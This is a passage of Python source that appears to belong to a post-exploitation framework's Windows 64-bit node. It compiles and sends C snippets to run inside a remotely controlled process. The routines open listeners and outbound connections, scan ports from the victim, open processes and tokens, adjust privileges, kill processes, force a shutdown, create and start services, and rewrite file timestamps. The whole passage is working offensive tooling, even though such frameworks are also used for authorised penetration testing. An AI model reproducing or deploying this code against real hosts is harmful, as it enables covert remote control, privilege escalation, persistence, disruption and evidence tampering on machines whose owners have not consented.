            tv.tv_sec = timeout;

            // timeout is in seconds
            i=select(1, &readfd, 0, &errorfd, &tv);
            sendint(i);
            if (i > 0) {
                // Theoretically, we dont need to check if fd is our fd, cause we
                // only send one fd, our fd :D
                i = recv(fd, buf, length, 0);
                sendint(i);
                if (i > 0) {
                    senddata2self(buf,i);
                }
            }
        }
        """

        vars            = {}
        vars["fd"]      = fd
        vars["timeout"] = timeout
        vars["length"]  = length
        self.clearfunctioncache()
        message = self.compile(code, vars)
        self.sendrequest(message)
        select_value = sint32(self.readint())

        buffer = ""
        raise_socket_error = False
        if select_value > 0:
            # We
            recv_value = sint32(self.readint())
            if recv_value > 0:
                buffer = self.readblock()
            else:
                raise_socket_error = True
        self.leave()

        if raise_socket_error:
            # we got an error doing our RECV
            raise socket.error

        # if select_value is <=0, then we normally would raise a Timeout, but
        # because this is recv_lazy, we just return empty string

        devlog("win64","recv_lazy got %d bytes"%len(buffer))

        return buffer

    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        vars={}

        code="""
        #import "local","ws2_32.dll|socket" as "socket"
        #import "local","ws2_32.dll|bind" as "bind"
        #import "local","ws2_32.dll|listen" as "listen"

        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "int", "addr" as "addr"
        //#import "local", "debug" as "debug"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #include "socket.h"

        void main()
        {
          long long sockfd;
          int i;

          struct sockaddr_in serv_addr;

          serv_addr.family=AF_INET; //af_inet

          sockfd=socket(AF_INET,SOCK_STREAM,0);
          serv_addr.port=htons(port);
          serv_addr.addr=addr;
          i=bind(sockfd,&serv_addr,16);
          if (i != -1) {
            i=listen(sockfd,16);
            if (i != -1) {
              sendlonglong(sockfd); //success
            }
            else {
              sendlonglong(-2); //failed to listen
            }
          }
          else {
            sendlonglong(-1); //failed to bind
          }
        }
        """
        vars["port"]=port
        vars["addr"]=str2littleendian(socket.inet_aton(addr))
        vars["AF_INET"]=2
        vars["SOCK_STREAM"]=1
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readlonglong()
        self.leave()
        return fd


    def GetVersionEx(self):
        code="""
        #import "local", "kernel32.dll|GetVersionExA" as "GetVersionExA"
        #import "local", "sendint" as "sendint"
        #import "local", "sendshort" as "sendshort"
        #import "local", "sendstring" as "sendstring"
        #import "local", "memset" as "memset"

        struct OSVERSIONINFOEX {
          int dwOSVersionInfoSize;
          int dwMajorVersion;
          int dwMinorVersion;
          int dwBuildNumber;
          int dwPlatformId;
          char szCSDVersion[128];
          short wServicePackMajor;
          short wServicePackMinor;
          short wSuiteMask;
          //it's possible there's 2 characters here, for padding? I hope not.
          char wProductType;
          char wReserved;
          int pad; //dunno why this is here. But it is.
        };

        void main()
        {
           int ret;
           int error;
           int size;
           struct  OSVERSIONINFOEX osvi;
           size=156; // sizeof(osversioninfoex)+4 (for whatever reason)
           memset(&osvi,0,size);
           osvi.dwOSVersionInfoSize=size;

           ret=GetVersionExA(&osvi);
           //error=GetLastError();
           sendint(ret);
           if (ret!=0) {
               //success
               sendint(osvi.dwPlatformId);
               sendint(osvi.dwMajorVersion);
               sendint(osvi.dwMinorVersion);
               sendshort(osvi.wServicePackMajor);
               sendshort(osvi.wServicePackMinor);
               sendstring(osvi.szCSDVersion);
               sendint(osvi.wProductType);
           }
        }
        """


        vars={}
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            self.log("Could not get version information")
            val=None
            ret=0
            #val=self.readint() #error if ret!=0, else status
        else:
            val={}
            val["PlatformID"]=self.readint()
            val["Major Version"]=self.readint()
            val["Minor Version"]=self.readint()
            val["SP Major Version"]=self.readshort()
            val["SP Minor Version"]=self.readshort()
            val["SP string"]=self.readstring()
            val["Product Type"]=self.readint()
        self.leave()
        return ret,val

    def VerifyVersionInfo(self, major, minor):
        code = """
        #import "local", "kernel32.dll|VerifyVersionInfoA" as "VerifyVersionInfoA"
        #import "local", "kernel32.dll|VerSetConditionMask" as "VerSetConditionMask"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        #import "int", "major" as "major"
        #import "int", "minor" as "minor"


        #define VER_MINORVERSION        0x0000001
        #define VER_MAJORVERSION        0x0000002
        #define VER_PLATFORMID          0x0000008
        #define VER_SERVICEPACKMINOR    0x0000010
        #define VER_SERVICEPACKMAJOR    0x0000020

        #define VER_EQUAL               0x1
        #define VER_GREATER_EQUAL       0x3

        struct OSVERSIONINFOEX {
            int dwOSVersionInfoSize;
            int dwMajorVersion;
            int dwMinorVersion;
            int dwBuildNumber;
            int dwPlatformId;
            char szCSDVersion[128];
            short wServicePackMajor;
            short wServicePackMinor;
            short wSuiteMask;
            // it's possible there's 2 characters here, for padding? I hope not.
            char wProductType;
            char wReserved;
            int pad; //dunno why this is here. But it is.
        };

        void main()
        {
           int ret;
           int error;
           int size;
           struct OSVERSIONINFOEX osvi;
           size = 156; // sizeof(osversioninfoex) + 4 (for whatever reason)

           int op;
           op = VER_MAJORVERSION | VER_MINORVERSION;

           long long dwlConditionMask;
           dwlConditionMask = 0;

           VerSetConditionMask(dwlConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL);
           VerSetConditionMask(dwlConditionMask, VER_MINORVERSION, VER_GREATER_EQUAL);

           memset(&osvi, 0, size);
           osvi.dwOSVersionInfoSize = size;
           osvi.dwMajorVersion = major;
           osvi.dwMinorVersion = minor;

           ret = VerifyVersionInfoA(&osvi, op, dwlConditionMask);
           sendint(ret);
           if (ret == 0) {
               error = GetLastError();
               sendint(error);
           }
        }
        """

        lvars = {}
        lvars["major"] = major
        lvars["minor"] = minor

        self.clearfunctioncache()
        request = self.compile(code, lvars)
        self.sendrequest(request)
        ret = self.readint()
        error = 0

        if ret == 0:
            error = self.readint()
            if error != 0x47e and error != 0: # ERROR_OLD_WIN_VERSION
                logging.error("VerifyVersionInfo failed (%d)" % error)

        self.leave()

        return ret

    def socket(self, proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        code="""
        #import "local","ws2_32.dll|socket" as "socket"
        #import "local", "sendlonglong" as "sendlonglong"
        #import "int", "proto" as "proto"
        #import "int", "AF_INET" as "AF_INET"

        #import "local", "sendint" as "sendint"
        void main()
        {
          long long i;
          i=socket(AF_INET,proto,0);
          sendlonglong(i);
        }
        """
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            logging.error("Don't know anything about protocol %s in socket()"%proto)
            return -1

        vars={}
        vars["proto"]=proto
        vars["AF_INET"]=AF_INET

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readlonglong()
        self.leave()
        return ret


    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect, along with the corresponding socket() call.
        """
        devlog("shellserver::connect_sock", "Connect_sock(%s,%s,%s,%s,%s)"%(fd,host,port,proto,timeout))
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "long long", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #import "int", "timeout_usec" as "timeout_usec"
        #include "socket.h"
        #import "local","ws2_32.dll|connect" as "connect"
        #import "local","ws2_32.dll|closesocket" as "closesocket"
        #import "local","ws2_32.dll|socket" as "socket"
        #import "local","ws2_32.dll|select" as "select"

        #import "local", "debug" as "debug"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "int", "FIONBIO" as "FIONBIO"
        #import "local", "ws2_32.dll|ioctlsocket" as "ioctlsocket"

        void setblocking(long long sock,int blocking) {
        int NonBlock;
        if (blocking==0) {
              NonBlock=1;
        }
        else {
              NonBlock=0;
        }


        // Blocking   = 0
        // Noblocking = 1
        ioctlsocket(sock, FIONBIO, &NonBlock);
        }

        struct  fd_set {
                   int fd_count;
                   long long fd;
        };
        struct timeval {
                int tv_sec;
                int tv_usec; };

        void main()
        {

          struct sockaddr_in serv_addr;
          int blocking;
          struct fd_set writefd;
          struct timeval tv;
          int i;

          serv_addr.family=AF_INET; //af_inet
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);
          //no idea how to do this on win32
          //blocking=getblock(sockfd);
          //debug();
          setblocking(sockfd,0);


          connect(sockfd,&serv_addr,16);

          writefd.fd_count=1;
          writefd.fd = sockfd;

          tv.tv_usec= timeout_usec;
          tv.tv_sec = timeout;

          //timeout is in seconds
          i=select(1, 0, &writefd, 0, &tv);
          //i=select(1, 0, &writefd, 0, 0);
          //i=1;
          //i=writefd.fd;
          if (i==1) {
              sendint(0);
            }
            else {
              sendint(-1);
            }
          //setblocking(sockfd,blocking)
        }
        """
        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        #I had to add this because otherwise windows fails to work
        #at all. Windows sucks.
        if timeout<1:
            timeout=1

        #I added this too, which is now redundant, but whatever, it's
        #more strictly correct, I guess.
        timeout_usec=int((math.ceil(timeout)-timeout)*1000)
        timeout=int(math.floor(timeout))
        vars={}
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout
        vars["timeout_usec"]=timeout_usec
        vars["FIONBIO"]  = 0x8004667eL
        vars["AF_INET"]=AF_INET
        self.clearfunctioncache()
        message=self.compile(code,vars)

        self.sendrequest(message)
        ret=sint32(self.readint())
        devlog("shellserver:connect_sock","connect_sock : %d" % (ret) )
        if ret == -1:
            #for us, closed and timed out are the same thing!
            ret=-2
        self.leave()
        return ret

    def connect(self,fd,host,port,proto,timeout):
        """
        Does a connect, along with the corresponding socket() call.
        """
        if proto.lower()=="tcp":
            proto=SOCK_STREAM
        elif proto.lower()=="udp":
            proto=SOCK_DGRAM
        else:
            logging.error("Protocol not recognized")
            return -1

        return self.connect_sock(fd,host,port,proto,timeout)


    def old_connect_sock(self,fd,host,port,proto,timeout):
        logging.error("FAIL3!!!!!!!!!!!!!!!!!!!!!")


    def getsendcode(self,fd,buffer):
        """
        Reliable send to socket, returns a shellcode for use by
        Node and self
        """
        devlog('shellserver::getsendcode', "(WINDOWS) Sending %d bytes to fd %d" % (len(buffer), fd))
        code = """
        #import "int", "length" as "length"
        #import "long long", "fd" as "fd"
        #import "string", "buffer" as "buffer"

        #import "local","ws2_32.dll|send" as "send"
        #import "local", "sendint" as "sendint"

        void main()
        {
            int i;
            char *p;
            int wanted;
            wanted = length;
            p = buffer;
            while (wanted > 0 ) {
                i = send(fd, p, wanted, 0); // flags set to zero here
                if (i == 0xffffffff) {
                    wanted = 0;
                    sendint(0);
                    return;
                }

                wanted = wanted - i;
                p = p + i;
            }

            sendint(1);
        }
        """
        # XXX: check this with hasattr in MOSDEFNode
        # XXX: until everything is moved over
        self.special_shellserver_send = True
        vars            = {}
        vars["fd"]      = fd
        vars["length"]  = len(buffer)
        vars["buffer"]  = buffer

        self.clearfunctioncache()
        message = self.compile(code, vars)

        return message

    def send(self, fd, buffer):
        """
        non-reliable send to socket
        """
        #print "XXX: check for getsendcode mismatch here! (in WINDOWS shellserver)"
        message = self.getsendcode(fd, buffer)
        self.sendrequest(message)
        ret = sint32(self.readint())
        self.leave()
        if ret == 0:
            # failed to send data!
            raise Exception, "Failed to send data from win64Node"

        return len(buffer)

    def accept(self,fd):
        #TODO: make asyncronous!
        code="""
        #import "local","ws2_32.dll|accept" as "accept"
        #import "local","ws2_32.dll|WSAGetLastError" as "WSAGetLastError"
        #import "long long", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #import "local", "sendlonglong" as "sendlonglong"
        #include "socket.h"
        void main()
        {
        long long i;
        int error_code;
        struct sockaddr_in sa;
        int len;

        //I dont know why but len was making WSAFAULT, suppose that because it has no value
        i=accept(fd, &sa, 0);
        error_code = WSAGetLastError();
        sendlonglong(i);
        sendint(sa.addr);
        sendint(error_code);
        }
        """
        vars={}
        vars["fd"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readlonglong()
        addr=self.readint()
        error_code = self.readint()
        self.leave()
        devlog("shellserver:accept", "Accept (%s) returning: %d"%(fd,ret))
        devlog("shellserver:accept", "WSAGetLastError: %08x" % error_code)
        return ret

    def getpid(self):

        vars={}
        code="""
        #import "local", "kernel32.dll|GetCurrentProcessId" as "GetCurrentProcessId"
        #import "local","sendstring" as "sendstring"
        #import "local","sendint" as "sendint"

        void main() {
          int ret;
          ret=GetCurrentProcessId();
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def openprocess(self,pid,accessrights=0x43a, inheritable=0):
        vars={}
        code="""
        #import "local","kernel32.dll|OpenProcess" as "OpenProcess"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "long long", "pid" as "pid"
        #import "int", "inheritable" as "inheritable"
        #import "int", "accessrights" as "accessrights"
        #import "local","sendlonglong" as "sendlonglong"

        void main()
        {
        long long ret;
        ret=OpenProcess(accessrights,inheritable,pid);
        sendlonglong(ret);
        }
        """
        vars["pid"]=pid
        vars["accessrights"]=accessrights
        vars["inheritable"]=inheritable
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readlonglong()
        self.leave()
        return fd

    def openprocesstoken(self,phandle=None,accessrights=None):
        """
        phandle is a handle to a process, we will return the primary token of that process
        """
        if phandle==None:
            phandle=self.GetCurrentProcess()

        if accessrights==None:
            accessrights=TOKEN_DUPLICATE

        vars={}
        code="""
        #import "local","advapi32.dll|OpenProcessToken" as "OpenProcessToken"

        #import "local", "sendint" as "sendint"
        #import "local", "debug" as "debug"
        #import "long long", "pid" as "pid"
        #import "int", "accessrights" as "accessrights"
        #import "local","sendlonglong" as "sendlonglong"

        void main()
        {
        long long hToken;
        int ret;

        //debug();
        ret=OpenProcessToken(pid,accessrights,&hToken);
        if (ret==0) {
          sendlonglong(-1);
          return;
        }
        //else
        sendlonglong(hToken);

        }
        """
        vars["pid"]=phandle
        vars["accessrights"]=accessrights
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readlonglong()
        self.leave()
        return fd

    def lookupprivilegevalue(self,privname):
        #these nutty things are actually per-system, not global
        vars={}
        code="""
        #import "local","advapi32.dll|LookupPrivilegeValueA" as "LookupPrivilegeValueA"

        #import "local", "senddata2self" as "senddata2self"
        #import "local", "debug" as "debug"
        #import "string", "privname" as "privname"

        void main()
        {
        int ret;
        unsigned char luid[8];
        //debug();
        ret=LookupPrivilegeValueA(0,privname,&luid);
        if (ret==0) {
          senddata2self(luid,0);
          return;
        }
        //else
	senddata2self(luid,8);
        }
        """
        vars["privname"]=privname

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readblock()
        self.leave()
        return fd

    def AdjustTokenPrivs(self, token, luid, attributes):
        #these nutty things are actually per-system, not global
        vars={}
        code="""
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"
        #import "local", "advapi32.dll|AdjustTokenPrivileges" as "AdjustTokenPrivileges"

        #import "local", "sendint" as "sendint"
        #import "local", "memcpy" as "memcpy"

        #import "local", "debug" as "debug"
        #import "string", "luid" as "luid"
        #import "long long", "token" as "token"
        #import "int", "attributes" as "attributes"

        //we only support one. Otherwise, huge nightmare
        struct TOKEN_PRIVILEGES {
         int count;
         char luid[8];
         int attributes;
        };


        void main()
        {
        int res;
	int lasterror;
        struct TOKEN_PRIVILEGES tp;

        tp.count=1;
        memcpy(&tp+4,luid,8);
        tp.attributes=attributes;
        res=AdjustTokenPrivileges(token,0,&tp,0,0,0);
	lasterror=GetLastError();
        sendint(res);
	sendint(lasterror);
        }
        """

        vars["luid"]       = luid
        vars["attributes"] = attributes
        vars["token"]      = token

        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        res=self.readint()
        lasterror = self.readint() #function can return success but if GetLastError() is ERROR_NOT_ALL_ASSIGNED then it's pretty much the same as failure
        self.leave()
        return res, lasterror

    def ExitWindows(self, flags=None):
        if flags == None: flags = 0x00000008 #shutdown

        vars={}
        vars["flags"]=flags
        code="""
        #import "local", "user32.dll|ExitWindowsEx" as "ExitWindowsEx"
        #import "local", "sendint" as "sendint"
        #import "int", "flags" as "flags"

        #import "local","kernel32.dll|GetLastError" as "GetLastError"

        void main() {
          int ret;
          int lasterror;
          //power failure - sorry :>
          ret=ExitWindowsEx(flags,0x00060000);
          sendint(ret);
          lasterror=GetLastError();
          sendint(lasterror);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        reserror=self.readint()
        self.leave()
        return ret

    def dokillprocess(self,pid):
        """
        Kills a process identified by pid
        """
        vars={}
        vars["pid"]=int(pid)
        code="""
        #import "local", "kernel32.dll|OpenProcess" as "OpenProcess"
        #import "local", "kernel32.dll|TerminateProcess" as "TerminateProcess"
        #import "local", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "local","sendint" as "sendint"
        #import "int","pid" as "pid"

        void main() {
          int ret;
          long long h;
          char empty[1];

          empty[0]=0;
          //debug();
          h=OpenProcess(1,0,pid); //1 is process_terminate, 0 for inheritable, and pid for pid
          if (h==0) {
             sendint(-2); // -2 for failed to open
             return;
          }
          ret=TerminateProcess(h,0); //0 for exit code
          if (ret==0) {
             sendint(-1); // -1 for failed to terminate
             CloseHandle(h);
             return;
          }
          sendint(1);
          CloseHandle(h);
        }
        """
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        self.leave()
        return ret

    def tcpportscan(self,args):
        """ TCP Connect scan from the remote host.
        Args: network to scan, startport, endport
        """
        argsL=args.split(" ")
        tm = 150000
        if len(argsL) == 4:
            try:
                tm = int(argsL[3])
            except:
                tm = 150000

        return self.tcpConnectScan(argsL[0],int(argsL[1]),int(argsL[2]), timeout=tm)

    def OpenSCManager(self,machineName=None,databaseName=None,access=None):
        """
        Opens a handle to the service control manager
        """

        code="""
        #import "local","advapi32.dll|OpenSCManagerA" as "OpenSCManagerA"

        #import "local", "sendint" as "sendint"
        #import "int", "access" as "access"
        #import "local", "sendlonglong" as "sendlonglong"
        """
        if machineName!=None:
            code+="""
            #import "string", "machineName" as "machineName"
            """
        else:
            machineName=0
            code+="""
            #import "long long", "machineName" as "machineName"
            """
        if databaseName!=None:
            code+="""
            #import "string", "databaseName" as "databaseName"
            """
        else:
            databaseName=0
            code+="""
            #import "long long", "databaseName" as "databaseName"
            """

        code+="""

        void main()
        {
           long long ret;
        ret=OpenSCManagerA(machineName,databaseName,access);
        sendlonglong(ret);
        //debug();
        }
        """

        if access==None:
            access=GENERIC_READ
        vars={}
        vars["machineName"]=machineName
        vars["databaseName"]=databaseName
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readlonglong()
        logging.debug('OpenSCManager: %d' % ret)
        self.leave()
        return ret


    def EnumServicesStatusEx(self,hManager,dwServiceType=SERVICE_WIN32,dwServiceState=SERVICE_STATE_ALL,ResumeHandle=0):
        """
        Enumerate all the services
        """

        code="""
        #import "local","advapi32.dll|EnumServicesStatusExA" as "EnumServicesStatusExA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "sendstring" as "sendstring"
        #import "local", "malloc" as "malloc"
        #import "local", "free" as "free"
        #import "long long", "hManager" as "hManager"
        #import "int", "InfoLevel" as "InfoLevel"
        #import "int", "dwServiceType" as "dwServiceType"
        #import "int", "dwServiceState" as "dwServiceState"
        #import "int", "ResumeHandle" as "ResumeHandle"

         struct SERVICE_STATUS_PROCESS {
         int dwServiceType;
         int dwCurrentState;
         int dwControlsAccepted;
         int dwWin32ExitCode;
         int dwServiceSpecificExitCode;
         int dwCheckPoint;
         int dwWaitHint;
         int dwProcessId;
         int dwServiceFlags;
         int padding;
         };

        struct ENUM_SERVICE_STATUS_PROCESS {
        char * lpServiceName;
        char * lpDisplayName;
        struct SERVICE_STATUS_PROCESS ServiceStatusProcess;
        };
        void main()
        {
           int ret;
           int error;
           int i;
           int * lpResumeHandle;
           int sbBufSize;
           char  * lpServices;
           int ServicesReturned;
           int cbBytesNeeded;
           int myResumeHandle;
           struct ENUM_SERVICE_STATUS_PROCESS * curr_service;
           struct SERVICE_STATUS_PROCESS * curr_serv_stat;


           //code
           myResumeHandle=ResumeHandle;
           lpResumeHandle=&myResumeHandle;
           lpServices=malloc(256000);
           sbBufSize=256000;

           // Add pszGroupName later
           ret=EnumServicesStatusExA(hManager,InfoLevel,dwServiceType,dwServiceState,lpServices,sbBufSize,&cbBytesNeeded,&ServicesReturned,lpResumeHandle,0);
           error=GetLastError();
           sendint(ret);
           if (ret==0) {
              sendint(error);
            }
            else {
              sendint(ServicesReturned);
              i=0;
              curr_service=lpServices;
              while (i<ServicesReturned)  {
                sendstring(curr_service->lpServiceName);
                sendstring(curr_service->lpDisplayName);
                // MOSDEF C isn't like normal C when you do this kind of thing
                curr_serv_stat=curr_service->ServiceStatusProcess;
                sendint(curr_serv_stat->dwCurrentState);
                sendint(curr_serv_stat->dwProcessId);

                i=i+1;
                curr_service=curr_service+1;
              }
            }
            free(lpServices);
        }
        """
        SC_ENUM_PROCESS_INFO=0
        InfoLevel=SC_ENUM_PROCESS_INFO

        vars={}
        vars["hManager"]=hManager
        vars["InfoLevel"]=InfoLevel
        #SERVICE_DRIVER Enumerates services of type SERVICE_KERNEL_DRIVER and SERVICE_FILE_SYSTEM_DRIVER.
        #SERVICE_WIN32 Enumerates services of type SERVICE_WIN32_OWN_PROCESS and SERVICE_WIN32_SHARE_PROCESS.
        vars["dwServiceType"]=dwServiceType
        vars["dwServiceState"]=dwServiceState
        vars["ResumeHandle"]=ResumeHandle


        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint() #error if ret==0
        if ret==0:
            val=self.readint() #services returned, or error code
        else:
            val=[]
            num=self.readint() #number of structures to read
            #print "num is %d"%num
            for i in range(0,num):
                name=self.readstring()
                displayname=self.readstring()
                state=self.readint()
                pid=self.readint()
                devlog("win32","% 5d   (%d)   [% 25s] %s" % (pid, state, name, displayname))
                val+=[(name,iso8859toascii(displayname),state,pid)]
        self.leave()
        return ret,val

    def CloseServiceHandle(self,handle):
        code="""
        #import "local","advapi32.dll|CloseServiceHandle" as "CloseServiceHandle"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"

        void main()
        {
           int ret;
           ret=CloseServiceHandle(hService);
        }
        """


        vars={}
        vars["hService"]=handle

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        self.leave()
        return

    def GetFileTime(self,fd):
        code="""
        #import "local","kernel32.dll|GetFileTime" as "GetFileTime"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "long long", "fd" as "fd"

        struct FILETIME {
          int low;
          int high;
        };

        void main()
        {
           int ret;
           int error;
           struct FILETIME create;
           struct FILETIME access;
           struct FILETIME modify;

           ret=GetFileTime(fd,&create,&access,&modify);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           } else {
              sendint(create.low);
              sendint(create.high);
              sendint(access.low);
              sendint(access.high);
              sendint(modify.low);
              sendint(modify.high);
           }
        }
        """


        vars={}
        vars["fd"]=fd

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        if ret==0:
            error=self.readint()
            val=error
        else:
            create=(self.readint(),self.readint())
            access=(self.readint(),self.readint())
            modify=(self.readint(),self.readint())
            #Return a tuple of times, which are also tuples
            val=(create,access,modify)
        self.leave()
        return ret,val


    def OpenService(self,hSCManager,serviceName,access=None):
        """
        Opens a handle to the service control manager
        """

        code="""
        #import "local","advapi32.dll|OpenServiceA" as "OpenServiceA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "int", "access" as "access"
        #import "long long", "hSCManager" as "hSCManager"
        #import "string", "serviceName" as "serviceName"
        #import "local", "sendlonglong" as "sendlonglong"


        void main()
        {
           long long ret;
           int error;
           ret=OpenServiceA(hSCManager,serviceName,access);
           error=GetLastError();
           sendlonglong(ret);
           if (ret==0) {
              sendint(error);
           }
        }
        """


        if access==None:
            access=SERVICE_START | SERVICE_QUERY_STATUS
        vars={}
        vars["hSCManager"]=hSCManager
        vars["serviceName"]=serviceName
        vars["access"]=access

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readlonglong()
        error=0
        if ret==0:
            error=self.readint()
        self.leave()
        return ret,error

    def SetFileTime(self,fd,times):
        """
        SetFileTime:
        FD is the fd to write to
        Times is a tuple of (Create,Access,Write)
        """
        code="""
        #import "local","kernel32.dll|SetFileTime" as "SetFileTime"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "local", "readintfromself" as "readintfromself"
        #import "long long", "fd" as "fd"

        struct FILETIME {
          int low;
          int high;
        };

        void main()
        {
           struct FILETIME create;
           struct FILETIME access;
           struct FILETIME modify;

           create.low=readintfromself();
           create.high=readintfromself();
           access.low=readintfromself();
           access.high=readintfromself();
           modify.low=readintfromself();
           modify.high=readintfromself();

           int ret;
           int error;
           ret=SetFileTime(fd,&create,&access,&modify);
           error=GetLastError();
           sendint(ret);
           if (ret == 0) {
              sendint(error);
           }
        }
        """


        vars={}
        vars["fd"]=fd

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)

        #send six integers to remote side as structure parts
        for atime in times:
            for half in atime:
                self.sendint(half)

        ret=self.readint()
        if ret==0:
            error=self.readint()
        else:
            error=0
        self.leave()
        return ret,error

        #http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dllproc/base/createservice.asp
    def CreateService(self,hSC,serviceName,displayName,access,serviceType,startType,errorControl,binaryName,startName=None,password=None,loadOrderGroup=0,tagid=None,dependancies=0):
        """
        On success returns a handle to the new service
        On failure, returns null
        """
        if tagid==None:
            tagid=0 #null pointer
        if password==None:
            password=0 #null pointer
        if startName == None:
            startName = 0 # null pointer

        code="""
        #import "local","advapi32.dll|CreateServiceA" as "CreateServiceA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"


        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"
        #import "string", "lpServiceName" as "lpServiceName"
        #import "string", "lpDisplayName" as "lpDisplayName"
        #import "int", "dwDesiredAccess" as "dwDesiredAccess"
        #import "int", "dwServiceType" as "dwServiceType"
        #import "int", "dwStartType" as "dwStartType"
        #import "int", "dwErrorControl" as "dwErrorControl"
        #import "string", "lpBinaryPathName" as "lpBinaryPathName"
        #import "string", "lpLoadOrderGroup" as "lpLoadOrderGroup"
        #import "int", "lpdwTagId" as "lpdwTagId"
        #import "string", "lpDependencies" as "lpDependencies"        //really should be stringorint
        #import "string", "lpServiceStartName" as "lpServiceStartName"
        #import "string", "lpPassword" as "lpPassword"

        #import "local","sendlonglong" as "sendlonglong"


        void main()
        {
           long long ret;
           int error;
           // Add arguments later
           ret=CreateServiceA(hService,lpServiceName,lpDisplayName,dwDesiredAccess,dwServiceType,dwStartType,dwErrorControl,lpBinaryPathName,lpLoadOrderGroup,lpdwTagId,lpDependencies,lpServiceStartName,lpPassword);
           error=GetLastError();
           sendlonglong(ret);
           //ret of zero indicates failure
           if (ret==0) {
             sendint(error);
            }
        }
        """
        vars={}
        vars["hService"]=hSC
        vars["lpServiceName"]= serviceName
        vars["lpDisplayName"]= displayName
        vars["dwDesiredAccess"]=access
        vars["dwServiceType"]= serviceType
        vars["dwStartType"]= startType
        vars["dwErrorControl"]= errorControl
        vars["lpBinaryPathName"]= binaryName
        vars["lpLoadOrderGroup"]= loadOrderGroup
        vars["lpdwTagId"]= tagid
        vars["lpDependencies"]= dependancies
        vars["lpServiceStartName"]= startName
        vars["lpPassword"]= password

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readlonglong()
        ##Non zero return on success
        if ret==0:
            #error
            val=self.readint()
        else:
            val="No error"
        self.leave()
        return ret,val


    def StartService(self,hService):
        """
        Starts a Service
        """

        code="""
        #import "local","advapi32.dll|StartServiceA" as "StartServiceA"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"

        void main()
        {
           int ret;
           int error;

           // Add arguments later
           ret=StartServiceA(hService,0,0);
           error=GetLastError();
           sendint(ret);
           sendint(error);
        }
        """


        vars={}
        vars["hService"]=hService

        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        ret=self.readint()
        error=self.readint()
        self.leave()
        return ret,error

    def QueryServiceStatus(self,hService):
        """
        Starts a Service
        """

        code="""
        #import "local","advapi32.dll|QueryServiceStatus" as "QueryServiceStatus"
        #import "local", "kernel32.dll|GetLastError" as "GetLastError"

        #import "local", "sendint" as "sendint"
        #import "long long", "hService" as "hService"

        struct SERVICE_STATUS {
        int dwServiceType;
        int dwCurrentState;
        int dwControlsAccepted;
        int dwWin32ExitCode;
        int dwServiceSpecificExitCode;
